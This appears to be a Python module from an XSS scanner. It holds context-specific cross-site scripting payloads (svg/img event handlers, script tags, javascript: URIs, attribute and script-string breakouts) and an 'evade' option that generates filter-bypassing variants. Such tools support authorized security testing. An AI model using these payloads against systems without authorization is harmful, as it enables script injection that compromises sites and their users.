from __future__ import annotations

import os
import secrets

from . import mutate

BUNDLED_FULL = os.path.join(os.path.dirname(__file__), "data", "payloads_full.txt")

DEFAULT = [
    '"><svg onload=alert(1)>',
    "'><svg onload=alert(1)>",
    '"><svg/onload=alert(1)>',
    '<svg onload=alert(1)>',
    '<svg/onload=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    "'><img src=x onerror=alert(1)>",
    '<img src=x onerror=alert(1)>',
    '<img/src=x/onerror=alert(1)>',
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    '"><script>alert(document.domain)</script>',
    '<body onload=alert(1)>',
    '"><body onload=alert(1)>',
    '<body/onpageshow=alert(1)>',
    '"><details open ontoggle=alert(1)>',
    '<details/open/ontoggle=alert(1)>',
    '"><marquee onstart=alert(1)>',
    '<marquee onstart=alert(1)>',
    '"><input autofocus onfocus=alert(1)>',
    '<input autofocus onfocus=alert(1)>',
    '"><select autofocus onfocus=alert(1)>',
    '"><textarea autofocus onfocus=alert(1)>',
    '"><video src=x onerror=alert(1)>',
    '"><audio src=x onerror=alert(1)>',
    '<video/src=x/onerror=alert(1)>',
    '"><iframe src=javascript:alert(1)>',
    '<iframe src=javascript:alert(1)>',
    '"><object data=javascript:alert(1)>',
    '"><embed src=javascript:alert(1)>',
    '<a href=javascript:alert(1)>x</a>',
    '<div onpointerover=alert(1)>x</div>',
    '<xss id=x tabindex=1 onfocus=alert(1) autofocus></xss>',
    '<form><button formaction=javascript:alert(1)>x</button></form>',
    '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
    '<img src=x onerror=alert(String.fromCharCode(88,83,83))>',
    "'-alert(1)-'",
    '";alert(1)//',
    "';alert(1)//",
    'javascript:alert(1)',
]

CONTEXT_PAYLOADS = {
    "html": [
        '"><svg onload=alert(1)>',
        "'><svg onload=alert(1)>",
        '"><svg/onload=alert(1)>',
        '"><img src=x onerror=alert(1)>',
        "'><img src=x onerror=alert(1)>",
        '<svg onload=alert(1)>',
        '<img src=x onerror=alert(1)>',
        '"><details open ontoggle=alert(1)>',
        '"><body onload=alert(1)>',
        '"><iframe src=javascript:alert(1)>',
        '"><script>alert(1)</script>',
        '"><script>alert(document.domain)</script>',
    ],
    "attribute": [
        '"><svg onload=alert(1)>',
        '" onmouseover=alert(1) x="',
        '" autofocus onfocus=alert(1) x="',
        '" onpointerover=alert(1) x="',
        "'><svg onload=alert(1)>",
        "' onmouseover=alert(1) x='",
        "' autofocus onfocus=alert(1) x='",
    ],
    "attribute_unquoted": [
        ' onmouseover=alert(1) ',
        ' autofocus onfocus=alert(1) ',
        ' onpointerover=alert(1) ',
        ' src=x onerror=alert(1) ',
    ],
    "script": [
        "';alert(1)//",
        '";alert(1)//',
        "'-alert(1)-'",
        '"-alert(1)-"',
        "'};alert(1);//",
        '</script><svg onload=alert(1)>',
    ],
    "comment": [
        '--><svg onload=alert(1)>',
        '--!><svg onload=alert(1)>',
        '--><img src=x onerror=alert(1)>',
    ],
    "rcdata": [
        '</textarea><svg onload=alert(1)>',
        '</title><svg onload=alert(1)>',
        '</textarea><img src=x onerror=alert(1)>',
    ],
    "style": [
        '</style><svg onload=alert(1)>',
        '</style><script>alert(1)</script>',
    ],
    "uri": [
        'javascript:alert(1)',
        'javascript:alert(document.domain)',
        'jAvAsCrIpt:alert(1)',
        'java\tscript:alert(1)',
        '"><svg onload=alert(1)>',
        "'><svg onload=alert(1)>",
    ],
    "encoded": [],
    "json_reflection": [
        '</script><svg onload=alert(1)>',
        '"><svg onload=alert(1)>',
    ],
}

CONTEXT_PAYLOAD = {
    "html": '"><svg onload=alert(1)>',
    "attribute": '" onmouseover=alert(1) x="',
    "attribute_unquoted": " onmouseover=alert(1) ",
    "uri": "javascript:alert(1)",
    "script": "';alert(1)//",
    "encoded": None,
    "json_reflection": None,
}


def marker():
    return "xq" + secrets.token_hex(4) + "qx"


def for_context(context, base=None, char_map=None, evade=False):
    out = []
    seen = set()
    for p in CONTEXT_PAYLOADS.get(context, []):
        if p not in seen:
            seen.add(p)
            out.append(p)
    for p in (base if base is not None else DEFAULT):
        if p not in seen:
            seen.add(p)
            out.append(p)
    if evade:
        extra = []
        for p in list(out):
            for v in mutate.variants(p, char_map):
                if v not in seen:
                    seen.add(v)
                    extra.append(v)
        out += extra
    return out


def load(path=None):
    if not path:
        return list(DEFAULT)
    items = []
    with open(path, encoding="utf-8", errors="replace") as f:
        for line in f:
            line = line.strip()
            if line:
                items.append(line)
    return items or list(DEFAULT)


def load_full():
    return load(BUNDLED_FULL)
